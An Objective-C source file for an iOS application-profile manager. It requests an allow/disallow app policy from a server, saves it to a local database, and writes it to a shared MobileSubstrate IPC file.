//
//  ApplicationProfileManagerImpl.m
//  ApplicationProfileManager
//
//  Created by Makara Khloth on 7/9/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "ApplicationProfileManagerImpl.h"
#import "ApplicationProfileDelegate.h"
#import "ApplicationProfileDatabase.h"
#import "ApplicationProfileDAO.h"
#import "AppPolicyProfile.h"
#import "AppProfile.h"
#import "DataDelivery.h"
#import "DeliveryRequest.h"
#import "GetApplicationProfile.h"
#import "DeliveryResponse.h"
#import "GetApplicationProfileResponse.h"
#import "ResponseApplicationProfileProvider.h"
#import "ApplicationProfile.h"
#import "ApplicationProfileInfo.h"
#import "SharedFileIPC.h"
#import "DefStd.h"

@interface ApplicationProfileManagerImpl (private)
- (BOOL) sendAppProfile;
- (BOOL) getAppProfile;
- (DeliveryRequest *) sendAppProfileRequest;
- (DeliveryRequest *) getAppProfileRequest;

- (void) processServerReponseSuccess: (DeliveryResponse *) aResponse;
@end

@implementation ApplicationProfileManagerImpl

- (id) initWithDDM: (id <DataDelivery>) aDDM {
	if ((self = [super init])) {
		mDDM = aDDM;
		mAppProfileDatabase = [[ApplicationProfileDatabase alloc] initOpenWithDatabaseFileName:@"appsprofile.db"];
		if ([mDDM isRequestPendingForCaller:kDDC_AppsProfileManager]) {
			[mDDM registerCaller:kDDC_AppsProfileManager withListener:self];
		}
	}
	return (self);
}

- (void) start {
	BOOL On = YES;
	SharedFileIPC *sFile = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate3];
	[sFile writeData:[NSData dataWithBytes:&On length:sizeof(BOOL)] withID:kSharedFileIsAppProfileEnableID];
	[sFile release];
}

- (void) stop {
	DLog (@"stop---")
	BOOL Off = NO;
	SharedFileIPC *sFile = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate3];
	[sFile writeData:[NSData dataWithBytes:&Off length:sizeof(BOOL)] withID:kSharedFileIsAppProfileEnableID];
	[sFile release];
	
	[NSObject cancelPreviousPerformRequestsWithTarget:self
											 selector:@selector(deliverAppProfile:)
											   object:nil];
	[NSObject cancelPreviousPerformRequestsWithTarget:self
											 selector:@selector(syncAppProfile:)
											   object:nil];
}

- (void) clearApplicationProfile {
	ApplicationProfileDAO *dao = [[ApplicationProfileDAO alloc] initWithDatabase:[mAppProfileDatabase mDatabase]];
	[dao clear];
	[dao release];
}

- (BOOL) deliverAppProfile: (id <ApplicationProfileDelegate>) aDelegate {
	BOOL success = [self sendAppProfile];
	if (success) mDeliverAppProfileDelegate = aDelegate;
	return (success);
}

- (BOOL) syncAppProfile: (id <ApplicationProfileDelegate>) aDelegate {
	DLog (@">>>>>>>> syncAppProfile")
	BOOL success = [self getAppProfile];
	if (success) mSyncAppProfileDelegate = aDelegate;
	return (success);
}

- (void) requestFinished: (DeliveryResponse*) aResponse {
	DLog (@">>>>>>> requestFinish")
	id <ApplicationProfileDelegate> delegate = nil;
	if ([aResponse mEDPType] == kEDPTypeSendAppsProfile) {
		DLog (@">>>>>>> kEDPTypeSendAppsProfile")
		delegate = mDeliverAppProfileDelegate;
		mDeliverAppProfileDelegate = nil;
		if ([delegate respondsToSelector:@selector(deliverAppProfileDidFinished:)]) {
			if ([aResponse mSuccess]) {
				[delegate performSelector:@selector(deliverAppProfileDidFinished:) withObject:nil];
			} else {
				NSError *error = [NSError errorWithDomain:@"Send applications profiles" code:[aResponse mStatusCode] userInfo:nil];
				[delegate performSelector:@selector(deliverAppProfileDidFinished:) withObject:error];
				
				// Requirement: retry every one minute if fail
				[self performSelector:@selector(deliverAppProfile:)
						   withObject:nil
						   afterDelay:60];
			}
		}
	} else if ([aResponse mEDPType] == kEDPTypeGetAppsProfile) {
		DLog (@">>>>>>> kEDPTypeGetAppsProfile")
		delegate = mSyncAppProfileDelegate;
		mSyncAppProfileDelegate = nil;
		if ([delegate respondsToSelector:@selector(syncAppProfileDidFinished:)]) {
			if ([aResponse mSuccess]) {
				[self processServerReponseSuccess:aResponse];
				[delegate performSelector:@selector(syncAppProfileDidFinished:) withObject:nil];
			} else {
				NSError *error = [NSError errorWithDomain:@"Get applications profiles" code:[aResponse mStatusCode] userInfo:nil];
				[delegate performSelector:@selector(syncAppProfileDidFinished:) withObject:error];
				
				// Requirement: retry every one minute if fail
				[self performSelector:@selector(syncAppProfile:)
						   withObject:nil
						   afterDelay:60];
			}
		}
	}
}

- (void) updateRequestProgress: (DeliveryResponse*) aResponse {
	// NOTHING
}

- (BOOL) sendAppProfile {
	BOOL success = NO;
	DeliveryRequest* request = [self sendAppProfileRequest];
	if (![mDDM isRequestIsPending:request]) {
		// TODO: Implement later $$$
//		GetApplicationProfile* getAppProfile = [[GetApplicationProfile alloc] init];
//		[request setMCommandCode:[getAppProfile getCommand]];
//		[request setMCompressionFlag:1];
//		[request setMEncryptionFlag:1];
//		[request setMCommandData:getAppProfile];
//		[request setMDeliveryListener:self];
//		[mDDM deliver:request];
//		[getAppProfile release];
//		success = YES;
	}
	return (success);
}

- (BOOL) getAppProfile {
	DLog (@">>>>>>>>>>>> getAppProfile")
	BOOL success = NO;
	DeliveryRequest* request = [self getAppProfileRequest];
	if (![mDDM isRequestIsPending:request]) {
		DLog (@">>>>>>>>>>>> not pending")
		GetApplicationProfile* getAppProfile = [[GetApplicationProfile alloc] init];
		[request setMCommandCode:[getAppProfile getCommand]];
		[request setMCompressionFlag:1];
		[request setMEncryptionFlag:1];
		[request setMCommandData:getAppProfile];
		[request setMDeliveryListener:self];
		[mDDM deliver:request];
		[getAppProfile release];
		success = YES;
	}
	return (success);
}

- (DeliveryRequest *) sendAppProfileRequest {
	DeliveryRequest* request = [[DeliveryRequest alloc] init];
    [request setMCallerId:kDDC_AppsProfileManager];
    [request setMPriority:kDDMRequestPriortyNormal];
    [request setMMaxRetry:3];
    [request setMEDPType:kEDPTypeSendAppsProfile];
    [request setMRetryTimeout:60];
    [request setMConnectionTimeout:60];
	[request autorelease];
	return (request);
}

- (DeliveryRequest *) getAppProfileRequest {
	DeliveryRequest* request = [[DeliveryRequest alloc] init];
    [request setMCallerId:kDDC_AppsProfileManager];
    [request setMPriority:kDDMRequestPriortyNormal];
    [request setMMaxRetry:3];
    [request setMEDPType:kEDPTypeGetAppsProfile];
    [request setMRetryTimeout:60];
    [request setMConnectionTimeout:60];
	[request autorelease];
	return (request);
}

- (void) processServerReponseSuccess: (DeliveryResponse *) aResponse {
	DLog (@"processServerReponseSuccess")
	ApplicationProfileDAO *dao = [[ApplicationProfileDAO alloc] initWithDatabase:[mAppProfileDatabase mDatabase]];
	[dao clear];
	
	GetApplicationProfileResponse *response = (GetApplicationProfileResponse *)[aResponse mCSMReponse];
	ApplicationProfile *applicationProfile = [response mApplicationProfile];
	DLog (@"applicationProfile (0 allow/1 disallow): %@", applicationProfile)

	AppPolicyProfile *policyProfile = [[AppPolicyProfile alloc] init];
	[policyProfile setMDBID:0];
	[policyProfile setMPolicy:[applicationProfile mPolicy]];
	DLog (@"[applicationProfile mPolicy] %d", [applicationProfile mPolicy])	// 1 disallow 0 allow
	[policyProfile setMProfileName:[applicationProfile mProfileName]];
	[dao insertPolicyProfile:policyProfile];
	[policyProfile release];
	
	ResponseApplicationProfileProvider *provider = [applicationProfile mAllowAppsProvider];
	while ([provider hasNext]) {
		ApplicationProfileInfo *applicationProfileInfo = [provider getObject];
		AppProfile *appProfile = [[AppProfile alloc] init];
		[appProfile setMDBID:0];
		[appProfile setMIdentifier:[applicationProfileInfo mID]];
		[appProfile setMName:[applicationProfileInfo mName]];
		[appProfile setMType:[applicationProfileInfo mType]];
		[appProfile setMAllow:YES];
		DLog (@"AppProfile allowed: %@", appProfile)
		[dao insertAppProfile:appProfile];
		[appProfile release];
	}
	
	provider = [applicationProfile mDisAllowAppsProvider];
	while ([provider hasNext]) {
		ApplicationProfileInfo *applicationProfileInfo = [provider getObject];
		AppProfile *appProfile = [[AppProfile alloc] init];
		[appProfile setMDBID:0];
		[appProfile setMIdentifier:[applicationProfileInfo mID]];
		[appProfile setMName:[applicationProfileInfo mName]];
		[appProfile setMType:[applicationProfileInfo mType]];
		[appProfile setMAllow:NO];
		DLog (@"AppProfile disallowed: %@", appProfile)
		[dao insertAppProfile:appProfile];
		[appProfile release];
	}
	
	// Save to share ipc file
	NSMutableData *appPolicyProfileData = [NSMutableData data];
	NSArray *appPolicyProfiles = [dao selectPolicyProfiles];
	DLog (@"appPolicyProfiles: %@", appPolicyProfiles)
	
	NSInteger count = [appPolicyProfiles count];
	[appPolicyProfileData appendBytes:&count length:sizeof(NSInteger)];
	
	for (AppPolicyProfile *policyProfile in appPolicyProfiles) {
		NSInteger length = [[policyProfile toData] length];
		[appPolicyProfileData appendBytes:&length length:sizeof(NSInteger)];
		[appPolicyProfileData appendData:[policyProfile toData]];
	}
	
	NSMutableData *appProfileData = [NSMutableData data];
	NSArray *appsProfiles = [dao selectAppProfiles];
	count = [appsProfiles count];
	[appProfileData appendBytes:&count length:sizeof(NSInteger)];
	for (AppProfile *appProfile in appsProfiles) {
		NSInteger length = [[appProfile toData] length];
		[appProfileData appendBytes:&length length:sizeof(NSInteger)];
		[appProfileData appendData:[appProfile toData]];
	}
	
	SharedFileIPC *sFile = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate3];
	[sFile writeData:appPolicyProfileData withID:kSharedFileAppPolicyProfileID];
	[sFile writeData:appProfileData withID:kSharedFileAppsProfileID];
	[sFile release];
	
	[dao release];
}

- (void) dealloc {
	[mAppProfileDatabase release];
	[super dealloc];
}

@end
